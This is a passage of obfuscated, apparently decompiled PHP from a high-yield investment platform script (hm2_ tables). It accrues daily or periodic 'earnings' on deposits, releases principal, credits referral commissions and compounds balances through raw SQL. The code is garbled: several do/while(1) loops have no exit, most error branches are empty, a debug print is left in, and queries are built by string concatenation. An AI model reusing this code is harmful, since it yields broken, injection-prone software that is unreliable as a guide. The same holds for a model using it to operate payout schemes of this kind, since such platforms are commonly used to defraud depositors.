                            if ( 5 <= $elnlcIvDc && $elnlcELue[$elnlcNjKgR['elnlcFBaG']] == 1 )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = 0,\r\n                    type = 'earning',\r\n                    description = 'No interest on ".( $elnlcIvDc == 5 ? "Saturday" : "Sunday" )."',\r\n                    actual_amount = 0,\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                            }
                            else
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = {$elnlcVrlk},\r\n                    type = 'earning',\r\n                    description = 'Earning from deposit ".$elnlccQgz[$elnlcNjKgR['elnlcOAEP']].number_format( $elnlcELue[$elnlcNjKgR['elnlcHMum']], 2 )." - {$elnlcMPfma} %',\r\n                    actual_amount = {$elnlcVrlk},\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                            }
                            if ( !mysql_query( $q ) )
                            {
                            }
                        }
                        $elnlcgrDGC = "";
                        if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlctCKl'] )
                        {
                            if ( $elnlcELue[$elnlcNjKgR['elnlclVRTo']] == 0 || $elnlcELue[$elnlcNjKgR['elnlclVRTo']] && $elnlcELue[$elnlcNjKgR['elnlcNqiTF']] )
                            {
                                $elnlcgrDGC = ", status = 'off'";
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcPigm']] == 1 && ( $elnlcELue[$elnlcNjKgR['elnlclVRTo']] == 0 || $elnlcELue[$elnlcNjKgR['elnlclVRTo']] && $elnlcELue[$elnlcNjKgR['elnlcNqiTF']] ) )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = ".$elnlcELue[$elnlcNjKgR['elnlcHMum']].",\r\n                    type='release_deposit',\r\n                    actual_amount = ".$elnlcELue[$elnlcNjKgR['elnlcHMum']].",\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                        }
                        else
                        {
                            if ( 5 <= $elnlcIvDc && $elnlcELue[$elnlcNjKgR['elnlcFBaG']] == 1 )
                            {
                            }
                            else
                            {
                                if ( 0 < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] && $elnlcELue[$elnlcNjKgR['elnlctVNTl']] <= 100 && $elnlcELue[$elnlcNjKgR['elnlcJQpQ']] == 1 )
                                {
                                    if ( $elnlcELue[$elnlcNjKgR['elnlcIhaw']] == 0 )
                                    {
                                        $elnlcELue[$elnlcNjKgR['elnlcIhaw']] = $elnlcELue[$elnlcNjKgR['elnlcHMum']] + 1;
                                    }
                                    if ( $elnlcELue[$elnlcNjKgR['elnlcPAec']] <= $elnlcELue[$elnlcNjKgR['elnlcHMum']] && $elnlcELue[$elnlcNjKgR['elnlcHMum']] <= $elnlcELue[$elnlcNjKgR['elnlcIhaw']] )
                                    {
                                        if ( $elnlcELue[$elnlcNjKgR['elnlcTjzT']] == 1 )
                                        {
                                            $elnlcGDKaO = preg_split( "/\\s*,\\s*/", $elnlcELue[$elnlcNjKgR['elnlcFIfO']] );
                                            if ( !in_array( $elnlcELue[$elnlcNjKgR['elnlctVNTl']], $elnlcGDKaO ) )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcGDKaO[0];
                                            }
                                        }
                                        else
                                        {
                                            if ( $elnlcELue[$elnlcNjKgR['elnlctVNTl']] < $elnlcELue[$elnlcNjKgR['elnlccFKts']] )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcELue[$elnlcNjKgR['elnlccFKts']];
                                            }
                                            if ( $elnlcELue[$elnlcNjKgR['elnlcckhi']] < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] )
                                            {
                                                $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcELue[$elnlcNjKgR['elnlcckhi']];
                                            }
                                        }
                                    }
                                    else
                                    {
                                        $elnlcELue[$elnlcNjKgR['elnlctVNTl']] = $elnlcNjKgR['elnlcuSFVu'];
                                    }
                                    if ( 0 < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] && $elnlcELue[$elnlcNjKgR['elnlctVNTl']] <= 100 )
                                    {
                                        $elnlcwGhG = $elnlcVrlk * $elnlcELue[$elnlcNjKgR['elnlctVNTl']] / 100;
                                        $elnlcVrlk = floor( ( floor( $elnlcVrlk * 100000 ) / 100000 - floor( $elnlcwGhG * 100000 ) / 100000 ) * 100 ) / 100;
                                        $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                        amount = -{$elnlcwGhG},\r\n                    \t\ttype='deposit',\r\n                    \t\tdescription = 'Compounding deposit',\r\n                    \t\tactual_amount = -{$elnlcwGhG},\r\n                    \t\tec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    \t\tdate = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                                deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                        $q = "update hm2_deposits set amount = amount + {$elnlcwGhG},\r\n                    \t\tactual_amount = actual_amount + {$elnlcwGhG}\r\n                    \t\twhere id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                    }
                                }
                                elnlcdohum( $elnlcELue[$elnlcNjKgR['elnlcohjn']], $elnlcVrlk, "date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}" );
                            }
                        }
                        $q = "update hm2_deposits set \r\n      \tq_pays = q_pays + 1, \r\n      \tlast_pay_date = last_pay_date + interval {$elnlcItiUC} {$elnlcgrDGC} where id =".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                        if ( !mysql_query( $q ) )
                        {
                        }
                    }
                } while ( 1 );
            }
            $q = "select * from hm2_types where q_days > 0";
            $elnlccfAC = mysql_query( $q );
            do
            {
                if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
                {
                    if ( $elnlcELue[$elnlcNjKgR['elnlcFBaG']] == 1 )
                    {
                        $elnlcDtGfo = floor( $elnlcELue[$elnlcNjKgR['elnlciimMw']] / 5 ) * 7 + $elnlcELue[$elnlcNjKgR['elnlciimMw']] % 5;
                        $elnlcmagG = $elnlcELue[$elnlcNjKgR['elnlchewMj']] - ( 0 < $elnlcELue[$elnlcNjKgR['elnlchewMj']] ? 1 : 0 );
                        $elnlcbyvxA = " ({$elnlcDtGfo} + (({$elnlcELue[$elnlcNjKgR['elnlciimMw']]} % 5 + WEEKDAY(deposit_date)) > 5)*2 + {$elnlcmagG}) ";
                    }
                    else
                    {
                        $elnlcDtGfo = $elnlcELue[$elnlcNjKgR['elnlciimMw']] + $elnlcELue[$elnlcNjKgR['elnlchewMj']] - ( 0 < $elnlcELue[$elnlcNjKgR['elnlchewMj']] ? 1 : 0 );
                        $elnlcbyvxA = " {$elnlcDtGfo} ";
                    }
                    $elnlcstVj = $elnlcELue[$elnlcNjKgR['elnlcohjn']];
                    if ( $elnlcELue[$elnlcNjKgR['elnlcPigm']] == 1 )
                    {
                        $q = "select * from hm2_deposits where \r\n                type_id = {$elnlcstVj} and \r\n                status = 'on' and \r\n                user_id = {$elnlcRMjNn} and \r\n                (\r\n                   deposit_date + interval {$elnlcbyvxA} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < last_pay_date\r\n                      or\r\n                   deposit_date + interval {$elnlcbyvxA} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now()\r\n                )\r\n                and\r\n                (\r\n                   ({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} = 0) || ({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} && (deposit_date + interval {$elnlcELue[$elnlcNjKgR['elnlcjHPDN']]} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now())))\r\n             ";
                        $elnlcqBcqg = mysql_query( $q );
                        while ( $elnlcChoo = mysql_fetch_array( $elnlcqBcqg ) )
                        {
                            $q = "insert into hm2_history set\r\n                user_id = ".$elnlcChoo[$elnlcNjKgR['elnlclLVw']].",\r\n      \t\tamount = ".$elnlcChoo[$elnlcNjKgR['elnlcHMum']].",\r\n      \t\ttype='release_deposit',\r\n      \t\tactual_amount = ".$elnlcChoo[$elnlcNjKgR['elnlcHMum']].",\r\n                ec = ".$elnlcChoo[$elnlcNjKgR['elnlccwLV']].",\r\n      \t\tdate = '".$elnlcChoo[$elnlcNjKgR['elnlcTChj']]."' + interval {$elnlcDtGfo} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" ).",\r\n                deposit_id = ".$elnlcChoo[$elnlcNjKgR['elnlcohjn']];
                            if ( !mysql_query( $q ) )
                            {
                            }
                        }
                    }
                    $q = "update hm2_deposits set status='off' where \r\n             user_id = {$elnlcRMjNn} and \r\n    \t       (deposit_date + interval {$elnlcbyvxA} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < last_pay_date\r\n                  or\r\n                deposit_date + interval {$elnlcbyvxA} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now()) and\r\n               (({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} = 0) || ({$elnlcELue[$elnlcNjKgR['elnlclVRTo']]} && (deposit_date + interval {$elnlcELue[$elnlcNjKgR['elnlcjHPDN']]} ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? "hour" : "day" )." < now()))) and\r\n             type_id = {$elnlcstVj}\r\n           ";
                    if ( !mysql_query( $q ) )
                    {
                    }
                }
            } while ( 1 );
        }
    }
}

function elnlcqeufy( $elnlcCNAi )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    $elnlcCJNDN = array( );
    if ( $elnlccQgz[$elnlcNjKgR['elnlcozpI']] == 1 && $elnlcCNAi != -2 )
    {
    }
    else
    {
        $q = "select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = 'on' and hm2_types.id = hm2_plans.parent order by parent, min_deposit";
        if ( !( $elnlccfAC = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
        {
            $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcPpDvW']]][$elnlcELue[$elnlcNjKgR['elnlcohjn']]] = $elnlcELue;
        }
        $elnlcOrJNk = $elnlcNjKgR['elnlcqGMK'];
        $elnlcODMO = "u.last_access_time + interval 30 minute < now() ";
        if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcDpHN'] )
        {
            $elnlcGgoCE = "t.send_profit_to_stocks,t.send_percent_to_stocks";
            $elnlcguGd = " t.pay_by_button = 0 and";
        }
        if ( $elnlcCNAi == -1 )
        {
            $elnlcODMO = "1 = 1";
            $q = "select * from hm2_users where l_e_t + interval 15 minute < now() and status = 'on'";
        }
        else
        {
            $q = "select * from hm2_users where id = {$elnlcCNAi} and status = 'on'";
        }
        if ( $elnlcCNAi == -2 )
        {
            $q = "select * from hm2_users where status = 'on'";
            $q = "select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id";
        }
        if ( !( $elnlcwWcoU = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcGTJx = mysql_fetch_array( $elnlcwWcoU ) )
        {
            $elnlcRMjNn = $elnlcGTJx[$elnlcNjKgR['elnlcohjn']];
            $elnlcbEvg = fopen( "./tmpl_c/lock_user{$elnlcRMjNn}", "w+" );
            if ( flock( $elnlcbEvg, LOCK_EX ) )
            {
            }
            else
            {
                fclose( $elnlcbEvg );
                continue;
            }
            $q = "update hm2_users set l_e_t = now() where id = {$elnlcRMjNn}";
            if ( !mysql_query( $q ) )
            {
            }
            $elnlcOrJNk = $elnlcNjKgR['elnlcqGMK'];
            $q = "select max(p.min_deposit) as min_deposit, p.parent as type_id from hm2_plans as p group by p.parent";
            if ( !( $elnlccfAC = mysql_query( $q ) ) )
            {
            }
            while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
            {
                $q = "select max_deposit as max_amount from hm2_plans where parent = {$elnlcELue[$elnlcNjKgR['elnlcAKAt']]} and min_deposit = {$elnlcELue[$elnlcNjKgR['elnlcjlBJ']]}";
                if ( !( $elnlcdtez = mysql_query( $q ) ) )
                {
                }
                do
                {
                    if ( $elnlciJDQr = mysql_fetch_array( $elnlcdtez ) )
                    {
                        $elnlcBHqbD[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] = $elnlciJDQr[$elnlcNjKgR['elnlcSBQNQ']];
                    }
                } while ( 1 );
            }
            while ( 0 < $elnlcOrJNk )
            {
                $q = "select \r\n              d.*, \r\n              t.period as period, t.use_compound as use_compound,\r\n              t.compound_min_deposit, t.compound_max_deposit,\r\n              t.compound_min_percent, t.compound_max_percent,\r\n              t.compound_percents_type, t.compound_percents,\r\n/*              t.rpcp as rpcp,*/\r\n              t.work_week as work_week,\r\n              t.q_days as q_days, t.withdraw_principal,\r\n              t.delay as delay,\r\n              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,\r\n              {$elnlcGgoCE}\r\n              t.return_profit as return_profit,\r\n              t.return_profit_percent as return_profit_percent\r\n            from\r\n              hm2_deposits as d,\r\n              hm2_types as t,\r\n              hm2_users as u\r\n            where \r\n              u.id = {$elnlcRMjNn} and \r\n              u.status = 'on' and \r\n              d.status='on' and \r\n              d.type_id = t.id and \r\n              t.status = 'on' and \r\n              u.id = d.user_id and\r\n              {$elnlcguGd}\r\n              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = 'h', 60*60, 60*60*24))) or t.q_days = 0) and \r\n              (\r\n                (d.last_pay_date + interval 1 hour <= now() and t.period = 'h')or\r\n                (d.last_pay_date + interval 1 day <= now() and t.period = 'd')or\r\n                (d.last_pay_date + interval 7 day <= now() and t.period = 'w') or\r\n                (d.last_pay_date + interval 14 day <= now() and t.period = 'b-w') or\r\n                (d.last_pay_date + interval 1 month <= now() and t.period = 'm') or\r\n                (d.last_pay_date + interval 2 month <= now() and t.period = '2m') or\r\n                (d.last_pay_date + interval 3 month <= now() and t.period = '3m') or\r\n                (d.last_pay_date + interval 6 month <= now() and t.period = '6m') or\r\n                (d.last_pay_date + interval 1 year <= now() and t.period = 'y') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = 'end') \r\n              ) and\r\n              ((t.q_days = 0) or \r\n                (               \r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = 'h') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = 'd') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = 'w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = 'b-w') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = 'm') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = '2m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = '3m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = '6m') or\r\n                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = 'y') or\r\n                (t.q_days > 0 and t.period = 'end') \r\n              ))";
                if ( !( $elnlccfAC = mysql_query( $q ) ) )
                {
                }
                $elnlcOrJNk = $elnlcNjKgR['elnlcuSFVu'];
                do
                {
                    if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
                    {
                        ++$elnlcOrJNk;
                        if ( !isset( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] ) )
                        {
                            continue;
                        }
                        $elnlcMPfma = $elnlcNjKgR['elnlcuSFVu'];
                        $elnlcfNqo = $elnlcNjKgR['elnlcuSFVu'];
                        reset( $elnlcCJNDN );
                        reset( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] );
                        $elnlcDrFtL = each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] )[1];
                        $elnlcwody = each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] )[0];
                        while ( each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] ) )
                        {
                            if ( $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] <= $elnlcELue[$elnlcNjKgR['elnlcHMum']] && ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] <= $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] || $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] == 0 ) )
                            {
                                $elnlcMPfma = $elnlcDrFtL[$elnlcNjKgR['elnlcLDncy']];
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] < $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] && $elnlcMPfma == 0 )
                            {
                                $elnlcMPfma = $elnlcfNqo;
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] < $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] && 0 < $elnlcMPfma )
                            {
                                break;
                            }
                            $elnlcfNqo = $elnlcDrFtL[$elnlcNjKgR['elnlcLDncy']];
                        }
                        if ( $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] != 0 && $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] < $elnlcELue[$elnlcNjKgR['elnlcHMum']] )
                        {
                            $elnlcMPfma = $elnlcfNqo;
                        }
                        $elnlcVrlk = $elnlcELue[$elnlcNjKgR['elnlcHMum']] * $elnlcMPfma / 100;
                        $elnlcItiUC = "";
                        if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcIRKW'] )
                        {
                            $elnlcItiUC = " 1 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] )
                        {
                            $elnlcItiUC = " 1 hour ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcaMSd'] )
                        {
                            $elnlcItiUC = " 7 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == "b-w" )
                        {
                            $elnlcItiUC = " 14 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcUSFe'] )
                        {
                            $elnlcItiUC = " 1 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcJJEVd'] )
                        {
                            $elnlcItiUC = " 2 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcrQnF'] )
                        {
                            $elnlcItiUC = " 3 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcrUjC'] )
                        {
                            $elnlcItiUC = " 6 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcdSav'] )
                        {
                            $elnlcItiUC = " 1 year ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlctCKl'] )
                        {
                            $elnlcItiUC = " ".$elnlcELue[$elnlcNjKgR['elnlciimMw']]." day ";
                        }
                        if ( $elnlcMPfma == 0 && $elnlcItiUC == "" )
                        {
                            continue;
                        }
                        $elnlcIvDc = -1;
                        $q = "select weekday('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}) as dw";
                        if ( !( $elnlcdtez = mysql_query( $q ) ) )
                        {
                        }
                        while ( $elnlciJDQr = mysql_fetch_array( $elnlcdtez ) )
                        {
                            $elnlcIvDc = $elnlciJDQr[$elnlcNjKgR['elnlcSzOy']];
                        }
                        $q = "select count(id) as `col` from hm2_history where \r\n\t\ttype = 'earning' and ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? " date_format(date, '%Y-%m-%d  %H') = date_format('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}, '%Y-%m-%d  %H') and" : "to_days(date) = to_days('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}) and " )." deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                        if ( !( $elnlcVoHIM = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcjlas = $elnlcNjKgR['elnlcuSFVu'];
                        while ( $elnlcTyBK = mysql_fetch_array( $elnlcVoHIM ) )
                        {
                            $elnlcjlas = $elnlcTyBK[$elnlcNjKgR['elnlcmzAk']];
                        }
                        if ( $elnlcjlas == 0 )
                        {
                            if ( 5 <= $elnlcIvDc && $elnlcELue[$elnlcNjKgR['elnlcFBaG']] == 1 )
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = 0,\r\n                    type = 'earning',\r\n                    description = 'No interest on ".( $elnlcIvDc == 5 ? "Saturday" : "Sunday" )."',\r\n                    actual_amount = 0,\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                            }
                            else
                            {
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = {$elnlcVrlk},\r\n                    type = 'earning',\r\n                    description = 'Earning from deposit ".$elnlccQgz[$elnlcNjKgR['elnlcOAEP']].number_format( $elnlcELue[$elnlcNjKgR['elnlcHMum']], 2 )." - {$elnlcMPfma} %',\r\n                    actual_amount = {$elnlcVrlk},\r\n                    date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    str = 'gg',\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                if ( !mysql_query( $q ) )
                                {
                                }
                                if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcCOel'] && 0 < $elnlcGTJx[$elnlcNjKgR['elnlcdQGL']] && 0 < $elnlccQgz[$elnlcNjKgR['elnlcjNelQ']] )
                                {
                                    $elnlcVEiFh = $elnlcVrlk * $elnlccQgz[$elnlcNjKgR['elnlcjNelQ']] / 100;
                                    $elnlccyTiN = elnlccplb( $elnlcGTJx[$elnlcNjKgR['elnlcikTzy']] );
                                    if ( $elnlccQgz[$elnlcNjKgR['elnlcHSOv']] <= $elnlcELue[$elnlcNjKgR['elnlcHMum']] )
                                    {
                                        $q = "select max(actual_amount) as maxam from hm2_deposits where user_id = {$elnlcGTJx[$elnlcNjKgR['elnlcdQGL']]} and status = 'on'";
                                        if ( !( $elnlcdtez = mysql_query( $q ) ) )
                                        {
                                        }
                                        $elnlcgPKAg = $elnlcNjKgR['elnlcuSFVu'];
                                        while ( $elnlciJDQr = mysql_fetch_array( $elnlcdtez ) )
                                        {
                                            $elnlcgPKAg = $elnlciJDQr[$elnlcNjKgR['elnlcaOiAl']];
                                        }
                                        if ( $elnlccQgz[$elnlcNjKgR['elnlcDxKiI']] <= $elnlcgPKAg )
                                        {
                                            $q = "insert into hm2_history set user_id = {$elnlcGTJx[$elnlcNjKgR['elnlcdQGL']]},\r\n\t\t\tamount = {$elnlcVEiFh},\r\n\t\t\ttype = 'commissions',\r\n\t\t\tdescription = 'Daily referral earning from user {$elnlccyTiN}',\r\n\t\t\tactual_amount = {$elnlcVEiFh},\r\n\t\t\tdate = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                        ec = {$elnlcELue[$elnlcNjKgR['elnlccwLV']]},\r\n\t\t\tstr = 'gg'";
                                            if ( !mysql_query( $q ) )
                                            {
                                            }
                                        }
                                    }
                                }
                                if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcDpHN'] && $elnlcELue[$elnlcNjKgR['elnlcwicQM']] )
                                {
                                    $elnlcubpiV = floor( $elnlcVrlk * $elnlcELue[$elnlcNjKgR['elnlcazvI']] ) / 100;
                                    if ( 0 < $elnlcubpiV )
                                    {
                                        $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                      amount = -{$elnlcubpiV},\r\n                      type = 'penality',\r\n                      description = 'Earning moved to Stocks account',\r\n                      actual_amount = -{$elnlcubpiV},\r\n                      date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                      ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                      str = 'gg',\r\n                      deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                        $q = "insert into sh2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                      amount = {$elnlcubpiV},\r\n                      type = 'bonus',\r\n                      description = 'Earning received to buy shares',\r\n                      actual_amount = {$elnlcubpiV},\r\n                      date = '".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC},\r\n                      ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                      str = 'gg'";
                                        if ( !mysql_query( $q ) )
                                        {
                                        }
                                    }
                                }
                            }
                        }
                        $elnlcgrDGC = "";
                        if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlctCKl'] )
                        {
                            if ( $elnlcELue[$elnlcNjKgR['elnlclVRTo']] == 0 || $elnlcELue[$elnlcNjKgR['elnlclVRTo']] && $elnlcELue[$elnlcNjKgR['elnlcNqiTF']] )
                            {
                                $elnlcgrDGC = ", status = 'off'";
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcPigm']] == 1 && ( $elnlcELue[$elnlcNjKgR['elnlclVRTo']] == 0 || $elnlcELue[$elnlcNjKgR['elnlclVRTo']] && $elnlcELue[$elnlcNjKgR['elnlcNqiTF']] ) )
                            {
                                $elnlcgJtr = $elnlcELue[$elnlcNjKgR['elnlcHMum']];
                                $q = "insert into hm2_history set user_id = ".$elnlcELue[$elnlcNjKgR['elnlclLVw']].",\r\n                    amount = ".$elnlcELue[$elnlcNjKgR['elnlcHMum']].",\r\n                    type='release_deposit',\r\n                    actual_amount = ".$elnlcgJtr.",\r\n                    ec = ".$elnlcELue[$elnlcNjKgR['elnlccwLV']].",\r\n                    date = '{$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]}' + interval {$elnlcItiUC},\r\n                    deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']].",\r\n                    description = 'Deposit release'";
                                if ( !mysql_query( $q ) )
                                {
                                }
                                if ( $elnlccQgz[$elnlcNjKgR['elnlctRkLC']] == $elnlcNjKgR['elnlcPeIe'] && 0 < $elnlcELue[$elnlcNjKgR['elnlctVNTl']] )
                                {
                                    $q = "select sum(actual_amount) as amt from hm2_history where deposit_id = {$elnlcELue[$elnlcNjKgR['elnlcohjn']]} and type = 'earning' and user_id = {$elnlcELue[$elnlcNjKgR['elnlclLVw']]}";
                                    print $q;
                                    if ( !( $elnlcQFdsE = mysql_query( $q ) ) )
                                    {
                                    }
                                    $elnlcnkyB = $elnlcNjKgR['elnlcuSFVu'];
                                    while ( $elnlcDJLVk = mysql_fetch_array( $elnlcQFdsE ) )
                                    {
